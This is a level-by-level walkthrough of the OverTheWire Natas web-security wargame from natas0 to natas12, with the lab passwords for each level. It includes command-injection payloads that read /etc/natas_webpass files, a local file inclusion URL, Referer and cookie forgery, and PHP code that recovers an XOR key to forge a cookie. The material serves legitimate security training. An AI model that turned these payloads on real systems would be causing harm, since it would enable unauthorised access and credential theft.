**[Natas0](http://natas0.natas.labs.overthewire.org)**  
```
username: natas0
password: natas0
```
Ctrl+U to view source code and got
```
username: natas1
password: gtVrDuiDfck831PqWsLEZy5gyDz1clto 
```
**[Natas01](http://natas1.natas.labs.overthewire.org)**    
Ctrl+U to view source code and got
```
username: natas2
password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi 
```

**[Natas02](http://natas2.natas.labs.overthewire.org)**  
Ctrl+U to view source code  
In line 15, we have tag img src="files/pixel.png"  
Check http://natas2.natas.labs.overthewire.org/files/ we got users.txt
```
username: natas3
password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 
```

**[Natas03](http://natas3.natas.labs.overthewire.org)**  
Ctrl+U to view source code  
We got hint
```
No more information leaks!! Not even Google will find it this time...
```
Check http://natas3.natas.labs.overthewire.org/robots.txt, we got /s3cr3t/  
Check http://natas3.natas.labs.overthewire.org/s3cr3t/, we got users.txt
```
username: natas4
password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ 
```

**[Natas04](http://natas4.natas.labs.overthewire.org)**  
We have a hint 
```
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```
Press <u>Refresh page</u>, using Burp suite, change Referer to http://natas5.natas.labs.overthewire.org/
```
username: natas5
password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
```

**[Natas05](http://natas5.natas.labs.overthewire.org)**   
We have a hint 
```
Access disallowed. You are not logged in
```
Check cookie, change value of cookie <i>loggedin</i> to 1, refresh page and got
```
username: natas6
password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 
```

**[Natas06](http://natas6.natas.labs.overthewire.org)**  
We have source code
```
<?
include "includes/secret.inc";

if(array_key_exists("submit", $_POST)) {
    if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```
Check http://natas6.natas.labs.overthewire.org/includes/secret.inc, we got
```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
Input secret and got
```
username: natas7
password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
```

**[Natas07](http://natas7.natas.labs.overthewire.org)**  
We have a hint
```
password for webuser natas8 is in /etc/natas_webpass/natas8
```
and the url http://natas7.natas.labs.overthewire.org/index.php?page=home  
Check http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 and got
```
username: natas8
password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
```

**[Natas08](http://natas8.natas.labs.overthewire.org)**  
We have source code
```
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
Try to decode the <i>encodeSecret</i>
```
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function decodeSecret($secret) {
    return base64_decode(strrev(hex2bin($secret)));
}

print decodeSecret($encodedSecret)
?>
oubWYf2kBq
```
Input <i>oubWYf2kBq</i> and got
```
username: natas9
password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
```

**[Natas09](http://natas9.natas.labs.overthewire.org)**  
We have source code
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
The code <i>passthru("grep -i $key dictionary.txt");</i> get your  input <i>$key</i> and run command line code  
Try to input
```
; cat /etc/natas_webpass/natas10; --
```
We got
```
username: natas10
password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu 
```

**[Natas10](http://natas10.natas.labs.overthewire.org)**  
We have source code
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
It's same Natas09 but have a filter <i>[;|&]</i>  
Try to input
```
.* /etc/natas_webpass/natas11
```
We got
```
username: natas11
password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK 
```

**[Natas11](http://natas11.natas.labs.overthewire.org)**  
We have source code
```
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```
Cookies are protected with XOR encryption, but let take a look, we can bypass function xor_encrypt because
```
message ^ key = encrypt_message
message ^ encrypt_message = key
```
```
<?php
    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
    $encodedSecret = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"; // Cookie

    print base64_decode($encodedSecret) ^ json_encode($defaultdata));
?>
```
We got the key <i>qw8J</i>
```
<?php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$fakeData = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"); // Change showpassword to yes
print base64_encode(xor_encrypt(json_encode($fakeData)));
?>
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```
Change cookie and we got
```
username: natas12
password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 
```

**[Natas12](http://natas12.natas.labs.overthewire.org)**  
We have source code
```
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```